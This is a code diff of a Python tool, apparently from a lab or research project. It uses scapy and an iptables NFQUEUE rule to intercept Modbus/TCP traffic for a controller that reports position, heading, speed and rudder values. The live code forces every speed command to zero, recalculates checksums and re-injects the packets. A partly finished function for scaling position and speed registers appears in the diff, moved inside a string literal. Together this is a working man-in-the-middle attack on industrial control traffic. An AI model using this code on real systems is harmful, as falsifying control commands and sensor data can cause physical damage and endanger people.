@@ -144,7 +144,7 @@ class mb:
         out = ""
 
         if show_transId:
-            out += mb.get_transId(pkt)
+            out += f"ID: {mb.get_transId(pkt)}  "
         
         if show_x:
             out += "X:"
@@ -217,6 +217,44 @@ class mb:
     modbus_layer.payload
     '''
 
+class packet_options:
+    
+    dm = [[1,0], [1,0], [1,0], [1,0], [1,0]]
+    '''
+
+        register_value[0] = int(register_value[0])*matrix[3][0] + matrix[3][1]
+        register_value[1] = int(register_value[1])*matrix[4][0] + matrix[4][1]
+        return pkt
+
+        # Position data: alter based on register addr
+        if getattr(modbus_layer, "funcCode", "?") == 6:
+            register_addr = getattr(pdu, "registerAddr", "?")
+            register_value = getattr(pdu, "registerValue", "?")
+            if register_addr == "?" or register_value == "?":
+                return pkt
+            # X
+            if register_addr == 10:
+                register_value = int(register_value)*matrix[0][0] + matrix[0][1]
+            # Y
+            elif register_addr == 11:
+                register_value = int(register_value)*matrix[1][0] + matrix[1][1]
+            # Theta
+            elif register_addr == 12:
+                register_value = int(register_value)*matrix[2][0] + matrix[2][1]
+            return pkt
+            
+        
+        # Recalculate fields
+        if pkt.haslayer(ModbusADURequest):
+            del pkt[ModbusADURequest].len
+        if pkt.haslayer(ModbusADUResponse):
+            del pkt[ModbusADUResponse].len
+
+        del pkt[TCP].chksum
+
+        return pkt
+        '''
+
 class net_filter_queue:
 
     def packet_listener(packet):
@@ -229,30 +267,15 @@ class net_filter_queue:
         #print('raw:',bytes(pl))
 
                     
-                        
-        
-        # if  pl.haslayer("Write Single Register"): 
-        #     print("Write register cache is:", pl['Write Single Register'].raw_packet_cache)  
-        #     print("Write register is:", pl['Write Single Register'])
         if mb.is_commands(pl):
             
             pl = mb.set_speed(pl, 0)
 
         if mb.is_modbus(pl):
 
-            mb.print_scannable(pl, convert=True)
+            mb.print_scannable(pl, show_transId=True, convert=True)
         
-        # elif pl.haslayer("Read Holding Registers Response"):
-        #     print("Register response is:", pl['Read Holding Registers Response'].registerVal)
-        #     print('Original payload is ',pl['Read Holding Registers Response'].registerVal)
-        # #pload2=list(bytes(pl['Read Holding Registers Response'].registerVal))
-        #     pload2=pl['Read Holding Registers Response'].registerVal
         
-        #     pload2[0]=7
-        #     print('payload2 is ',pload2)
-        # #pl['Write Single Register'].remove_payload
-        #     pl['Read Holding Registers Response'].registerVal=pload2
-        #     print('the new payload is ',pl['Read Holding Registers Response'].registerVal)
 
 
         del pl[TCP].chksum
@@ -268,17 +291,6 @@ class net_filter_queue:
         scapy.send(pl)
         packet.accept()
             
-            
-                
-            
-
-        #print('plllllllllllllllllllllllll')
-
-        
-
-        #print(packet)
-        
-        #packet.accept()
     def __setdown():
         os.system("sudo iptables -t mangle -D PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1") 
 
@@ -309,51 +321,6 @@ class net_filter_queue:
         net_filter_queue.running = False
 
 class scapy_sniffing:
-
-    # Modify packets according to inputs: mult & offset: default to 1x mult, +0 offset
-    # Don't work yet
-    def modify(pkt, matrix = [[1,0], [1,0], [1,0], [1,0], [1,0]]):
-        if (not pkt.haslayer(ModbusADURequest) and not pkt.haslayer(ModbusADUResponse)):
-            return pkt
-        modbus_layer = pkt.getlayer(ModbusADURequest) or pkt.getlayer(ModbusADUResponse)
-        pdu = getattr(modbus_layer, "payload", "?")
-        
-        # Response: speed & rudder: alter this
-        if pkt.haslayer(ModbusADUResponse) and getattr(pdu, "funcCode", "?") == 3:
-            register_value = getattr(pdu, "registerVal", "?")
-            if register_value == "?":
-                return pkt
-            register_value[0] = int(register_value[0])*matrix[3][0] + matrix[3][1]
-            register_value[1] = int(register_value[1])*matrix[4][0] + matrix[4][1]
-            return pkt
-
-        # Position data: alter based on register addr
-        if getattr(modbus_layer, "funcCode", "?") == 6:
-            register_addr = getattr(pdu, "registerAddr", "?")
-            register_value = getattr(pdu, "registerValue", "?")
-            if register_addr == "?" or register_value == "?":
-                return pkt
-            # X
-            if register_addr == 10:
-                register_value = int(register_value)*matrix[0][0] + matrix[0][1]
-            # Y
-            elif register_addr == 11:
-                register_value = int(register_value)*matrix[1][0] + matrix[1][1]
-            # Theta
-            elif register_addr == 12:
-                register_value = int(register_value)*matrix[2][0] + matrix[2][1]
-            return pkt
-            
-        
-        # Recalculate fields
-        if pkt.haslayer(ModbusADURequest):
-            del pkt[ModbusADURequest].len
-        if pkt.haslayer(ModbusADUResponse):
-            del pkt[ModbusADUResponse].len
-
-        del pkt[TCP].chksum
-
-        return pkt
         
     def start():
         def handle_packet(pkt):
